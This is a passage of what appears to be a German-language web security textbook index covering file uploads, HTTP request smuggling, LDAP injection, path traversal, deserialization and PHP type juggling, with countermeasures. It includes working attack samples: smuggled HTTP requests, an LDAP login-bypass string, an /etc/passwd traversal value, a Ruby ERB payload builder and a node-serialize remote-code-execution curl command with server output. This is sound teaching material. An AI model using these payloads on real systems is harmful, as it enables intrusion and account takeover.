passieren, dass die Authentication und Authorization nicht \u00fcberpr\u00fcft wird. Um dies zu vermeiden, sollte ein Download immer mittels einer dezidierten Downloadoperation, z.B. mittels <code>https://example.local/download?file_id=xxx</code>, durchgef\u00fchrt, und auf diese Weise durch den Applikationsserver ausgef\u00fchrt werden. Dabei sollten serverseitig die ben\u00f6tigten Zugriffsrechte \u00fcberpr\u00fcft werden, als Id wird die Verwendung einer zuf\u00e4lligen ID wie z.B. einer UUID empfohlen.</p>"},{"location":"server-side-attacks/file-uploads/#upload-von-malicious-files","title":"Upload von Malicious Files","text":"<p>Ein einfacher Angriff ist der der Upload von Dateien, die Code zur serverseitigen Ausf\u00fchrung beinhalten \u2014 z.B. das Hochladen von einer .php Datei bei Verwendung einer PHP Webapplikation. Der Angreifer w\u00fcrde nach dem Upload auf die Datei zugreifen und dadurch den Code am Server zur Ausf\u00fchrung bringen. Bei einem File-Upload sollten daher die m\u00f6glichen Dateitypen durch eine Whitelist auf Dateitypen, die nicht am Server exekutiert werden, beschr\u00e4nkt werden. Ebenso sollte mittels dem Content Disposition HTTP Header dem Browser mitgeteilt werden, dass eine bezogene Datei explizit heruntergeladen sollte (und nicht als Teil der Webapplikation ausgef\u00fchrt werden sollte).</p> <p>Eine weitere Empfehlung ist die Verwendung eines server-seitigen Virenscanners. Diese arbeiten zumeist auf Dateisystem-Basis \u2014 wird ein File mit b\u00f6sartigem Code hochgeladen, wird dieses gescannt und gegebenenfalls unter Quarant\u00e4ne gestellt bzw. gel\u00f6scht. Da die Webapplikation dies nicht automatisch bemerkt, kann es dabei zu Inkonsistenzen zwischen dem Dateisystem und verlinkten Dateien in der Webapplikation kommen. Eine saubere, aber aufwendige, L\u00f6sung w\u00e4re die Integration des Virenscanners in den Upload-Prozess der Webapplikation (z.B. \u00fcber ein API des Virenscanners). Ein workaround w\u00e4re es, falls der Virenscanner beim L\u00f6schen einer Datei eine gleichnamige Datei mit einem L\u00f6schhinweis hinterlegt. Auf diese Werden werden die toten Dateilinks innerhalb der Applikation vermieden.</p> <p>Besondere Beachtung sollte der Upload von gepackten Dateien (zip, rar) erhalten. Hier muss auf der einen Seite beachtet werden, dass Archive entpackt und der Inhalt des Archivs ebenso analysiert wird, auf der anderen Seite muss darauf geachtet werden, dass w\u00e4hrend des Entpackvorgangs kein Sicherheitsfehler passiert.</p> <p>Ein Spezialfall des Uploads von malicious Dateien ist der Upload von Dateien, die b\u00f6sartiten JavaScript-Code beinhalten. Da diese Angriffe gegen andere Clients (zumeist Webbrowser) abzielen, werden diese im Kapitel Client-seitige Injection Angriffe behandelt.</p>"},{"location":"server-side-attacks/file-uploads/#sandboxing","title":"Sandboxing","text":"<p>Falls eine Webapplikation nicht-vertrauensw\u00fcrde Dateien verarbeiten muss, muss diese Dateien aus nicht-vertrauensw\u00fcrdigen Quellen (Benutzer) analysieren. Dies ist eine notorisch gef\u00e4hrliche Operation und wird selten vollkommen sicher implementiert werden k\u00f6nnen. Um das potentielle Schadmass zu reduzieren kann Sandboxing verwendet werden. Dabei wird der Parse-Code in einem abgeschotteten Bereich des Systems ausgef\u00fchrt, im Falle eines erfolgreichen Angriffs wird zumindest nicht das Gesamtsystem kompromittiert.</p> <p>Wird server-seitig ein Virenscanner verwendet um hochgeladene Dateien auf Schadcode hin zu \u00fcberpr\u00fcfen, sollte dieser ebenso vom Rest des Systems abgeschottet werden. In den letzten Jahren wurden vermehrt Angriffe gegen Virenscanner festgestellt. Diese sind f\u00fcr Angreifer sehr lohnende Ziele, da sie alle incoming Dateien vor gereicht bekommen und zumeist mit administrativen Rechten ausgestattet sind.</p> <p>Techniken in diesem Umfeld beinhalten chroots, Jails, Container und Microservice-Architekturen.</p>"},{"location":"server-side-attacks/http-request-smuggling/","title":"HTTP Request Smuggling","text":"<p>Bei HTTP Request Smuggling versucht der Angreifer, einzelne HTTP Requests in ein System einzuschleusen. Der Angriff erfolgt nicht direkt gegen eine Webapplikation an-sich, sondern nutzt aus, dass bei modernen Webapplikationen zumeist mehrere Server involviert sind.Das HTTP verwendet eine nicht-eindeutige Kodierung der Request-L\u00e4nge, HTTP Request Smuggling tritt auf, wenn die verschiedenen Server bei dem indenten Request von unterschiedlichen Request-L\u00e4ngen ausgehen und daher diesen Request unterschiedlich zusammensetzen.</p> <p>Ein typisches Setup besteht aus einem Frontend- und einem einem Backend-Server. Das Frontend dient zumeist zum Cachen von Daten oder auch zur Zugriffskontrolle. Das Backend beinhaltet den Applikationsserver welcher schlussendlich den Request innerhalb des Applikationscodes behandelt. Problematisch ist, dass ein Frontend-System die Anfragen mehrerer Clients (Web-Browser) parallel entgegen nimmt und diese \u00fcber eine Verbindung an ein Backend-System weiterleitet. Die Verwendung einer TCP-Verbindung geschieht zumeist aus Performancegr\u00fcnden, da das wiederholte Aufbauen einer Verbindung zeitaufwendig w\u00e4re. Da nur nur eine Verbindung verwendet wird, m\u00fcssen Requests unterschiedlicher Browser nacheinander \u00fcber diese Verbindung \u00fcbertragen werden. Das Backend-System empf\u00e4ngt nun \u00fcber diese Verbindung die Anfragen, muss diese erneut in einzelne Requests zerlegen und schlussendlich abarbeiten. Damit das Backend die Grenzen der einzelnen Requests identifizieren kann, wird die L\u00e4ngenangabe innerhalb der Requests verwendet.</p> <p>HTTP beeinhaltet zwei M\u00f6glichkeiten die Requestl\u00e4nge zu definieren:</p> <ol> <li> <p>Der HTTP-Header Content-Lenght beinhaltet die L\u00e4nge des    Request-Bodies.</p> </li> <li> <p>Wird als HTTP-Header Transfer-Encoding: chunked verwendet, gibt es    keinen Header mit der L\u00e4nge des Requestbodies. Anstatt dessen k\u00f6nnen    als Requestbody mehrere Chunks \u00fcbertragen werden. Ein Chunk besteht    immer aus einer initialen Zeile mit der L\u00e4nge der Daten innerhalb    des aktuellen Chunks. Diese L\u00e4nge wird in hexadezimal Notation    \u00fcbergeben. Direkt an die Zeile mit der L\u00e4nge werden Daten    (entsprechend der \u00fcbertragenen L\u00e4nge) angeh\u00e4ngt. Ein Chunk wird mit    einer Leerzeile beendet. Schlussendlich wird der Reqeust mit einem    Chunk der L\u00e4nge 0 beendet.</p> </li> </ol> <p>Der Fall, dass sowohl Content-Length als auch Transfer-Encoding: chunked gesetzt sind, wurde im HTTP-Standard nicht definiert. Dementsprechend reagieren unterschiedliche Server auch unterschiedlich auf solche Requests. Dies kann von einem Angreifer ausgenutzt werden.</p> <p>Zwei einfache Beispiele[6] sollen dieses Verhalten erl\u00e4utern.</p> <p>Nehmen wir initial an, dass das Frontend Content-Length und das Backend chunked encoding verwendet. Folgender Request wird empfangen:</p> <pre><code> POST / HTTP/1.1\n Host: vulnerable-website.com\n Content-Length: 13\n Transfer-Encoding: chunked\n\n 0\n\n SMUGGLED \n</code></pre> <p>Das Frontend w\u00fcrde (aufgrund des Content-Length: 11 Headers) die gesamte Nachricht auf die Verbindung zum Backend kopieren. Ein paralleler Request eines zweiten Benutzers wird direkt danach auf die gleiche Leitung kopiert. Das Backend liest den Request, verwendet aber Chunked Encoding. Aufgrund des 0-Chunks (die initiale 0-Zeile) beendet es den ersten Request nach der Leerzeile (nach der 0) und verwendet den Rest der Eingabe als Beginn eines neuen Requests (der daher mit \u201c SMUGGLED\u201d beginnt). Der parallele Request eines anderen Benutzers wird direkt an den eingeschleusten Request als String angeh\u00e4ngt und wird dadurch Teil des eingeschleusten Requests.</p> <p>Der umgekehrte Fall: Frontend verwendet Chunked-Encoding, Backend verwendet Content-Length funktioniert \u00e4hnlich:</p> <pre><code>POST / HTTP/1.1\nHost: vulnerable-website.com\nContent-Length: 3\nTransfer-Encoding: chunked\n\n8\nSMUGGLED\n0\n</code></pre> <p>Hier wird allerdings eine Zeile mit 0 zwischen dem eingeschleusten Request und dem dazu-kopierten Folgerequest eines anderen Benutzers eingef\u00fcgt (da das Chunked-Encoding diese Zeile zum Beenden des Requests ben\u00f6tigt). Dies muss der Angreifer bei der Erstellung seines Angriffscodes ber\u00fccksichtigen.</p> <p>Wie kann dieses Verhalten bei einem Angriff ausgenutzt werden? Ein sch\u00f6nes Beispiel w\u00e4re eine Webapplikation, bei dem ein Benutzer Kommentare absetzen kann. Das Registrieren eines Benutzers ist auch f\u00fcr einen Angreifer m\u00f6glich. Hier k\u00f6nnte z.B. folgender Request als Angriff verwendet werden[7]:</p> <pre><code>GET / HTTP/1.1\nHost: vulnerable-website.com\nTransfer-Encoding: chunked\nContent-Length: 324\n\n0\n\nPOST /post/comment HTTP/1.1\nHost: vulnerable-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 400\nCookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO\n\ncsrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&amp;postId=2&amp;name=Carlos+Montoya&amp;email=carlos%40normal-user.net&amp;website=https%3A%2F%2Fnormal-user.net&amp;comment=\n</code></pre> <p>Unter der Annahme, dass das Frontend Content-Length und das Backend Chunked-Encoding verwendet w\u00fcrde folgendes passieren:</p> <ul> <li> <p>Das Frontend kopiert den gesamten Request auf die Verbindung zum   Backend.</p> </li> <li> <p>Das Backend versucht den Request zu erkennen, verwendet daf\u00fcr   Chunked-Encoding und beendet den Request mit dem 0-Chunk.</p> </li> <li> <p>Das Backend liest die n\u00e4chste Zeile Text und interpretiert diese als   Beginn eines neuen Requests. In diesem Fall w\u00e4re dies ein POSt   Request auf <code>/post/comment</code>.</p> </li> <li> <p>Da der Angreifer selbst ein Konto erstellen konnte, konnte dieser   eine valide Session als auch ein valides CSRF-Token generieren. Die   Session wird als HTTP-Header eingeschleust. Innerhalb des   eingeschleusten Requests wird auch das bekannte CSRF-Token gesetzt.</p> </li> <li> <p>Innerhalb des eingeschleusten Requests wird mit einem Request-Body   begonnen. In diesem werden mehrere Parameter gesetzt. Der   eingeschleuste Request endet mit einem comment=, also dem Wert der   als Kommentar vom User eingegeben werden sollte.</p> </li> <li> <p>Da das Backend nicht weiss, dass der Request beendet ist, liest es   die n\u00e4chsten Daten aus der eingehenden Verbindung. In diesem Fall   ist dies ein Request eines anderen Benutzers, der zeitgleich   abgegeben und vom Frontend direkt nach dem eingeschleusten Reqeust   in die Verbindung kopiert wurde.</p> </li> <li> <p>Die Applikationslogik interpretiert nun den Folgerequest als Inhalt   des Parameters comment, also als Kommentar der als Kommetar   gepostet werden sollte (da die Operation <code>/comment/post</code> war).</p> </li> <li> <p>Der Angreifer \u00fcberpr\u00fcft nun, ob ein neuer Kommentar mit sensiblen   Daten eines anderen Users an der betroffenen Stelle auftaucht.   Sensible Daten k\u00f6nnte z.B. Credentials im Zuge einer Login-Operation   oder auch ein HTTP-Header mit Session-Cookies sein. Falls m\u00f6glich,   w\u00fcrde der Angreifer diese Verwenden um serverseitig die Identit\u00e4t   des anderen Benutzers anzunehmen.</p> </li> <li> <p>Falls kein Kommentar erscheint oder der Kommentar nur sinnlose   Informationen beinhaltet, wiederholt der Angreifer den   Angriffsrequest (potentiell w\u00fcrde er ein neues CSRF-Token initial   generieren).</p> </li> </ul> <p>Was kann man gegen HTTP Request Smuggling Angriffe unternehmen? Mehrere M\u00f6glichkeiten w\u00fcrden diese unterbinden;</p> <ul> <li> <p>Sicherstellen, dass Front- und Backend die Request-L\u00e4nge ident   interpretieren.</p> </li> <li> <p>Am Frontend potentiell mehrdeutige Request-L\u00e4ngen mit eindeutigen   L\u00e4ngen ersetzen.</p> </li> <li> <p>Zwischen Front- und Backend f\u00fcr jeden Client-Request eine neue   Verbindung aufbauen. Dies wird zumeist aus Performance-Gr\u00fcnden nicht   durchgef\u00fchrt.</p> </li> <li> <p>Zwischen Front- und Backend HTTP/2 verwenden. Diese Protokollversion   besitzt die Mehrdeutigkeit der Requestl\u00e4ngen nicht mehr.</p> </li> </ul>"},{"location":"server-side-attacks/ldap-injections/","title":"LDAP-Injections","text":"<p>Das Lightweight Directory Access Protocol (LDAP) ist ein standardisiertes Protokoll welches aktuell h\u00e4ufig f\u00fcr den Zugriff auf Identifikations und Authentikationsdaten verwendet wird. Ein Angreifer kann hier, \u00e4hnlich zu Datenbank-Injections, das Verketten von Strings als Angriffsvektor verwenden.</p> <p>LDAP verwendet Key-Value Pairs um Daten zu speichern, bzw. zu identifizieren. Ein Beispiel:</p> <pre><code>(cn=Andreas Happe, ou=IT Security, dc=technikum-wien, ec=at)\n</code></pre> <p>Abfragen werden mit Hilfe einiger Sonderzeichen gebildet, diese m\u00fcssen innerhalb von Datenfeldern nicht maskiert werden:</p> <pre><code>* ( ) . &amp; - _ [ ] ` ~ | @ $ % ^ ? : { } ! '\n</code></pre> <p>Abfragen werden in prefix Notation geschrieben, folgende Abfrage sucht alle Namen, welche mit Andreas beginnen:</p> <pre><code>(cn=Andreas*)\n</code></pre> <p>Mehrere Abfragen k\u00f6nnen mit logsischen Operatoren verkn\u00fcpft werden, z.B. sucht folgendes nach einem Namen der mit \u2018Andreas\u2019\u2019 beginnt und mit \u2018Happe\u2019\u2019 endet:</p> <pre><code>(&amp;(cn=Andreas*)(cn=*Happe))\n</code></pre> <p>Verwendet ein Entwickler eine ungesicherte String-Concatination zur Erstellung einer Abfrage k\u00f6nnen, analog zu SQL-Injections, Fehler geschehen.</p> <p>Beispiel: wird ein Login \u00fcber Benutzername und Passwort \u00fcberpr\u00fcft k\u00f6nnte die dabei entstehende Abfrage folgend aussehen:</p> <pre><code>(&amp;(userID=happe)(password=trustno1))\n</code></pre> <p>Was passsiert, wenn der Angreifer *)(userID=*))(|(userID=* als Benutzername eingibt? Die resultierende Abfrage w\u00e4re:</p> <pre><code>(&amp;(userID=*)(userID=*))(|(userID=*)(password=anything))\n</code></pre> <p>Es entsteht eine Abfrage mit zwei Teilen die Und-verkn\u00fcpft werden. Der erste Part ist immer war (Tautologie). Aufgrund der Oder-Verkn\u00fcpfung ist auch der zweite Part immer war, in Summe ist der entstehende Ausdruck immer wahr und somit kann der Login umgangen werden.</p> <p>Weiter Informationen k\u00f6nnen dem Blog der Netsparker-Homepage[4] entnommen werden.</p>"},{"location":"server-side-attacks/path-traversals/","title":"Path Traversals","text":"<p>Bei einem Path Traversal wird versucht, \u00fcber modifizierte Parameter auf Ressourcen au\u00dferhalb des Webroots einer Webapplikation zuzugreifen. Auf diese Weise kann versucht werden, auf applikations-externe Ressourcen lesend oder schreibend zuzugreifen bzw. kann versucht werden, ausf\u00fchrbare Dateien am Server zu starten.</p> <p>Ein Beispiel f\u00fcr eine potentiell angreifbare Operation w\u00e4re <code>https://opfer.local/GetImage.jsp?file=diagram.jpg</code>. Ein Angreifer k\u00f6nnte versuchen, \u00fcber den Wert <code>./../../../../etc/passwd</code> f\u00fcr den Parameter file auf eine Datei au\u00dferhalb des Webroots zuzugreifen.</p> <p>Als Gegenma\u00dfnahme sollte prim\u00e4r versucht werden, nicht Dateinamen als benutzer-gesteuerten Parameter zu verwenden. Falls dies wirklich notwendig ist, sollten die Dateinamen gegen eine rigorose Whitelist und auf invalide Steuersignale hin (z.B. NULL-Characters und Zeilenumbr\u00fcche) \u00fcberpr\u00fcft werden und vor dem Zugriff auf Ressourcen der kanonische Pfad gebildet und verifiziert werden.</p> <p>Eine weitere Sicherheitsma\u00dfnahme w\u00e4re der Einsatz von Sandboxing-Techniken wie eines chroot. Durch Anwendung des Separation of Privileges Prinzips wird das Schadmass verkleinert: der Webserver sollte nur auf Dateien zugreifen k\u00f6nnen die f\u00fcr den Webserver relevant sind. Weitere Dateien (wie z.B. Systemdateien) sollten weder lesend noch schreibend zugreifbar sein.</p>"},{"location":"server-side-attacks/serialization-attacks/","title":"Serialisierungsangriffe","text":"<p>Die Serialisierung dient dazu, aus einem Objekt einer Programmiersprache zur Laufzeit eine Textrepresentation zu erstellen. Diese kann dann gespeichert oder \u00fcbertragen werden. Zu einem sp\u00e4teren Zeitpunkt kann aus dieser Textrepresentation wieder ein Programmiersprachen-Objekt erstellt und diese innerhalb einer Webapplikation verwendet werden.</p> <p>Das grunds\u00e4tzliche Problem ist, dass ein Angreifer das serialisierte Dokument abfangen und modifizieren kann. Auf diese Weise kann er das wieder-erstellte Objekte indirekt modifizieren oder auch w\u00e4hrend (oder nach) der Deserialisierung Schadcode zur Ausf\u00fchrung bringen.</p> <p>Hier ein einfaches Beispiel eines serialisierten Objekts in PHP (als auch eines modifizierten serialisierten Objekts). Die Annahme ist, dass ein Webserver die Daten des aktuellen Benutzers serialisiert, diese in einer Browser-Session client-seitig speichert und bei jedem Client-Zugriff das de-serialisierte Objekt verwendet um wieder das User-Objekt zu bauen:</p> <pre><code># Serialisiertes Objekt\na:4:{i:0;i:132;i:1;s:7:\"Mallory\";i:2;s:4:\"user\"; i:3;s:32:\"b6a8b3bea87fe0e05022f8f3c88bc960\";}\n\n# Modifiziertes Serialisiertes Objekt\na:4:{i:0;i:132;i:1;s:7:\"Mallory\";i:2;s:5:\"admin\"; i:3;s:32:\"b6a8b3bea87fe0e05022f8f3c88bc960\";}\n</code></pre> <p>In dem Beispiel wird ein einfaches Serialisierungsformat verwendet, String Elemente werden in der Form s:L\u00e4nge:Inhalt verwendet. Ein Angreifer w\u00fcrde z.B. innerhalb des Browsers diese serialisierten Daten modifizieren und z.B. aus dem String \u201cuser\u201d (L\u00e4nge 4) den String \u201cadmin\u201d (L\u00e4nge 5) machen und versuchen auf diese Weise eine Privilege Escalation durchzuf\u00fchren.</p> <p>Weitaus schwerwiegendere Angriffe sind ebenso m\u00f6glich:</p> <ul> <li> <p>Es gibt in PHP (wie in den meisten Programmiersprachen) Methoden,   die automatisch beim Erstellen bzw. Vernichten von Objekten   aufgerufen werden. Ein Angreifer kann anstatt (wie bei dem angegeben   Beispiel) einen Stringwert zu ver\u00e4ndern, den Stringwert mit einem   serialisierten Objekt ersetzen. Dieses Objekt muss nur eine (bei der   Serialisierung automatisch aufgerufene) Methode besitzen, die auf   eine Variable zugreift und diese als Code ausf\u00fchrt. Der Angreifer   w\u00fcrde im serialisierten Objekt nun den Wert dieser Variable auf den   Schadcode setzen und dadurch beim Deserialisieren eine serverseitige   Code-Execution erzeugen.</p> </li> <li> <p>Es k\u00f6nnen auch serialisierte Objekte mit Objektreferenzen gebaut   werden. Problematisch ist, dass die referenzierten Objekte w\u00e4hrend   der Deserialisierung auch Daten wieder freigeben k\u00f6nnen, man \u00fcber   die Objektreferenz allerdings noch auf diese zugreifen kann. Dies   f\u00fchrt zu use-after-free Bugs die f\u00fcr memory corruption-basierte   Angriffe ausgenutzt werden k\u00f6nnen.</p> </li> </ul>"},{"location":"server-side-attacks/serialization-attacks/#serialisierungsangriffe-in-java","title":"Serialisierungsangriffe in Java","text":"<p>Serialisierung innerhalb des Java-\u00d6kosystems besitzt das Problem, dass bei der Deserialisierung zuerst das de-serialisierte Objekt gebaut wird und erst danach der Typ, etc. des Objekts \u00fcberpr\u00fcft werden kann. Hier ein Beispiel:</p> <pre><code>InputStream is = request.getInputStream();\nObjectInputStream ois = new ObjectInputStream(is);\nAcmeObject acme = (AcmeObject)ois.readObject();\n</code></pre> <p>Dies bedeutet, dass die Java-Laufzeitumgebung initial aus einem nicht-vertrauensw\u00fcrdigem Dokument ein neues Java-Objekt erstellen muss. Ein Angreifer kann dies z.B. f\u00fcr einen einfachen DoS missbrauchen. So erstellt folgender Java-Code z.B. mehrere Hashes die ineinander verkn\u00fcpft werden. W\u00e4hrend solch ein Konstrukt gebaut und serialisiert werden kann, ergibt dies eine rekursive Datenstruktur mit unendlichem Speicherverbrauch beim Deserialisieren und bringt dadurch das Java Runtime Environment zum Absturz:</p> <pre><code>Set root = new HashSet();\nSet s1 = root;\nSet s2 = new HashSet();\n\nfor (int i = 0; i &lt; 100; i++) {\n  Set t1 = new HashSet();\n  Set t2 = new HashSet();\n  t1.add(\"foo\"); // make it not equal to t2\n  s1.add(t1);\n  s1.add(t2);\n  s2.add(t1);\n  s2.add(t2);\n  s1 = t1;\n  s2 = t2;\n}\n</code></pre>"},{"location":"server-side-attacks/serialization-attacks/#serialisierungsangriffe-in-ruby-on-rails","title":"Serialisierungsangriffe in Ruby on Rails","text":"<p>Ruby (on Rails) besitzt eine l\u00e4ngere Historie von Deserialiserungsangriffen. Ein Beispiel hierf\u00fcr verwendet die Rails ERB Klasse. Diese Klasse besitzt ein Element src in welchem Base64-codierter Source Code enthalten sein kann. Dieser Source Code wird bei Aufruf der Methode result eines ERB-Objektes intern aufgerufen.</p> <p>Ruby verwendet ein in XML-eingepacktes JSON-Dokument als Serialisierungsformat. Ein Angreifer k\u00f6nnte z.B. folgendes Dokument bauen, welches einem serialisierten ERB Objekt entspricht:</p> <pre><code>code  = File.read(ARGV[1])\n\n# Construct a YAML payload wrapped in XML\npayload = &lt;&lt;-PAYLOAD.strip.gsub(\"\\n\", \"&amp;#10;\")\n&lt;fail type=\"yaml\"&gt;\n--- !ruby/object:ERB\n template:\n    src: !binary |-\n        #{Base64.encode64(code)}\n&lt;/fail&gt;\nPAYLOAD\n</code></pre> <p>Der Code liest zuerst eine Payload aus einem File aus (der Pfad wird durch die Variable ARGV bereitgestellt) und erstellt dann ein Dokument welches ein serialisiertes ERB-Objekt beschreibt. Hier wurde nun src mit dem Schadcode bef\u00fcllt und falls die Webapplikation, welche dieses serialisierte Objekt entgegen nimmt, nun das Objekt deserialisert und auf die result Methode zugreift wird der b\u00f6sartige Code des Angreifers ausgef\u00fchrt. Dies entspricht einer Remote Command Injection, basierend auf einem Serialisierungsfehler.</p>"},{"location":"server-side-attacks/serialization-attacks/#serialisierungsangriffe-in-javascript-nodejs","title":"Serialisierungsangriffe in Javascript / Node.js","text":"<p>Ein sch\u00f6nes Beispiel f\u00fcr Serialisierungsangriffe ist folgende node.js Applikation welche die Serialisierungsbibliothek node-serialize verwendet:</p> <pre><code>const express = require('express');\nconst bodyParser = require('body-parser');\nconst serialize = require('node-serialize');\n\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: false }));\n\napp.post(\"/api/deserialize\", function(req, res) {\n    var str = \"\"+req.body.fubar;\n      const todo = serialize.unserialize(str);\n      console.log(todo);\n      res.send(\"wohoo!\");\n});\n\nconst server = app.listen(3000, function() {\n      console.log(\"Server started! (Express.js)\");\n\n        // Beispiel eines \"normalen\" serialisierten Objekts\n        const normal = {\n            todo: \"some string\"\n        };\n      console.log(\"serialized normal object\" + serialize.serialize(normal));\n});\n</code></pre> <p>Bei diesem Beispiel wird vom Server als Parameter ,,fubar\u201d ein serialisiertes Objekt als Text entgegen genommen, deserialisiert und ausgegeben. Das erwartete serialisierte Object wird nun \u00fcber das Kommandozeilentool curl an den Server \u00fcbertragen:</p> <pre><code>    $ curl -X POST -d \"fubar={\\\"todo\\\":\\\"some string\\\"}\" http://localhost:3000/api/deserialize\n\n    # Ausgabe am Server:\n    Server started! (Express.js)\n    serialized normal object: {\"todo\":\"some string\"}\n    serialized attack code: {\"todo\":\"_$$ND_FUNC$$_function() {\\n\\t\\t\\t\\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\\n\\t\\t\\t}\"}\n\n    { todo: 'some string' }\n</code></pre> <p>In Javascript kann eine Klasse/Objekt auch eine Funktion als Element besitzen. Folgende Klasse inkludiert z.B. unter dem Namen ,,todo\u201d nicht ein Attribut, sondern eine ausf\u00fchrbare Funktion:</p> <pre><code>// Beispiel eines serialisierten Objekts mit einer aufrufbaren Funktion\nconst todo = {\n      todo : function() {\n          // child_process kann verwendet werden um eine ausf\u00fchrbare Datei aufzurufen\n          require('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\n      }\n  };\n</code></pre> <p>Wird diese Klasse serialisiert, wird folgender serialisierter Text erstellt:</p> <pre><code>{\"todo\":\"_$$ND_FUNC$$_function() {\\n\\t\\t\\t\\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\\n\\t\\t\\t}\"}\n```k\n\nDieser inkludiert das Ausf\u00fchren eines Befehls (,,ls /bin\u201d) in der\nHoffnung, dass beim deserialisieren dieser Befehl am Server aufgerufen\nwerden w\u00fcrde. Dieses Kommando wird nun ebenso \u00fcber curl an den Server\n\u00fcbertragen:\n\n```text\n# Die Zeichen \\ und $ mussten teilweise maskiert werden\n$ curl -X POST -d \"fubar={\\\"todo\\\":\\\"_\\$\\$ND_FUNC\\$\\$_function() {\\n\\t\\t\\t\\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\\n\\t\\t\\t}\\\"}\" http://localhost:3000/api/deserialize\n\n# Ausgabe am Server:\n\n{ todo: [Function (anonymous)] }\n</code></pre> <p>Das Objekt wurde deserialisiert (inkl. der Methode mit dem Schadcode), w\u00fcrde diese Methode w\u00e4hrend der Request-Abarbeitung aufgerufen werden, w\u00fcrde unser Kommando am Server exekutiert werden. Wir k\u00f6nnen diesen Exploit noch verbessern indem wir durch Anh\u00e4ngen von ,,()\u201d nicht nur eine Funktion definieren, sondern diese auch direkt aufrufen. Dies w\u00fcrde folgendem serialiserten String bzw. folgendem Curl-Aufruf entsprechen:</p> <pre><code># curl Aufruf\n$ curl -X POST -d \"fubar={\\\"todo\\\":\\\"_\\$\\$ND_FUNC\\$\\$_function() {\\n\\t\\t\\t\\trequire('child_process').exec('ls /bin', function(error, stdout, stderr) {console.log(stdout)})\\n\\t\\t\\t}()\\\"}\" http://localhost:3000/api/deserialize\n</code></pre> <p>Die Ausgabe am Server zeigt nun, dass das Kommando ausgef\u00fchrt, und der Inhalt von /bin ausgegeben wurde:</p> <pre><code>    { todo: undefined }                                                                                                                         \n    [                                                                                                                                           \n    2to3-2.7                                                              \n    aa-enabled                                                                                                                                  \n    aa-exec                                                               \n    aa-features-abi                                                       \n    aconnect                                                              \n    acpi_listen                                                           \n    add-apt-repository                                                    \n    addpart                                                               \n    addr2line                                                             \n    afm2pl                                                                \n    afm2tfm                                                               \n    ag                                                                    \n    aleph\n    ...\n</code></pre>"},{"location":"server-side-attacks/serialization-attacks/#gegenmanahmen","title":"Gegenma\u00dfnahmen","text":"<p>Die Grundidee ist es, dass der Entwickler vor der Deserialisierung definieren muss, welche validen Objekttypen bei der Deserialisierung vorkommen d\u00fcrfen. Wie und ob dies \u00fcberhaupt m\u00f6glich ist, ist allerdings von der verwendeten Programmiersprache abh\u00e4ngig \u2014 z.B. muss bei \u00e4lteren Java-Versionen eine externe Serialisierungsbibliothek[5] verwendet werden um ein sicheres Verhalten zu erzielen.</p> <p>Zus\u00e4tzlich m\u00fcssen serialisierte Daten einer Integrit\u00e4tssicherung unterzogen werden (z.B. mittels einer Signatur oder eines MACs) damit ein Angreifer die serialisierten Daten nicht ver\u00e4ndern kann.</p> <p>Da diese Sicherungsmassnahmen teilweise schwer umsetzbar sind, empfiehlt OWASP, dass Daten nur deserialisert werden d\u00fcrfen, wenn diese aus einer authentischen und integrit\u00e4ts-gesch\u00fctzen Quelle kommen. Dadurch wird allerdings das Grundproblem nicht gel\u00f6st, sondern wird die Verantwortung und das Problem nur zu dem Anwender, der die Deserialisierung anst\u00f6\u00dft, verschoben. Falls ein Angreifer das Konto dieses Anwenders \u00fcbernehmen kann, erlangt er wiederum die M\u00f6glichkeit eine Deserialisierungattacke durchzuf\u00fchren.</p>"},{"location":"server-side-attacks/type-juggling/","title":"Type-Juggling Angriffe","text":"<p>Type Juggling Angriffe k\u00f6nnen in mehreren Programmiersprachen auftreten, besonders \u201cbekannt\u201d ist dieser Angriffsvektor in PHP. Diese Angriffe sind m\u00f6glich, wenn durch eine automatische, implizite Typkonvertierung das erwartete Resultat einer Operation verf\u00e4lscht wird. In PHP liegt das Grundproblem in den beiden Vergleichsoperatoren == (loose) und === (strict), ersterer f\u00fchrt automatisch Typkonvertierungen durch und wird leider h\u00e4ufig anstatt des sicheren zweiten Operators verwendet.</p> <p>Wird z.B. server-seitig in PHP ein String mit einer Zahl verglichen, wird der String automatisch in eine Zahl konvertiert, dies inkludiert Hex- und Octal-Darstellungen von Zahlen:</p> Operant A Operant B Ergebnis \"0000\" int(0) true \"0e42\" int(0) true \"1abc\" int(1) true \"abc\" int(0) true \"0xF\" \"15\" true \"0e1234\" \"0e5678\" true <p>Dies kann verwendet werden, um Vergleiche \u201ckurzzuschlie\u00dfen\u201d, wie folgendes Beispiel (aus einer \u00e4lteren WordPress-Version) zeigen soll. Hier wird die Benutzerauthorisierung \u00fcber einen berechneten MAC durchgef\u00fchrt. Der Anwender setzt mehrere Werte \u00fcber Cookies, die Integrit\u00e4t dieser Werte wird durch einen berechneten MAC verifiziert. Zur Berechnung des MACs wird ein geheimer Schl\u00fcssel (key in dem Beispiel) verwendet, der nie den Server verl\u00e4sst. Dies wird vereinfacht durch folgenden server-seitigen Code umgesetzt:</p> <pre><code>$hash = hash_mac('md5', $username . '|' . $expiration, $key);\nif ($hmac != $hash) {\n    // bad cookie, give error\n} else {\n    // accept operation\n}\n</code></pre> <p>username, expiration und hmac werden aus dem Cookie gelesen und k\u00f6nnen dadurch durch den Angreifer bestimmt werden. Ein Angreifer kann nun username auf Administrator, und hmac auf den Wert 0 setzen. Nun kann er einen Brute-Force Angriff ausf\u00fchren, bei dem das Ablaufdatem (expiration) au feinen zuf\u00e4lligen Wert gesetzt wird. Der Angreifer hofft, dass bei einem der Zugriffe zuf\u00e4llig als Hash ein Wert generiert wird, der mit \"0e\u2026\" beginnt, da hier automatisch eine Konvertierung des Wertes auf 0 passieren w\u00fcrde. Dies entspricht dem \u00fcbergebenen hmac (der ebenso 0) ist und eine server-seitige Administratoren-Identit\u00e4t ist \u00fcbernommen.</p>"},{"location":"server-side-attacks/xml-based-attacks/","title":"XML-basierte Angriffe","text":"<p>Werden von einem Webserver XML-Daten entgegengenommen und serverseitig bearbeitet, entstehen mehrere potentielle Angriffsvektoren. Zwei davon, XML External Entities und 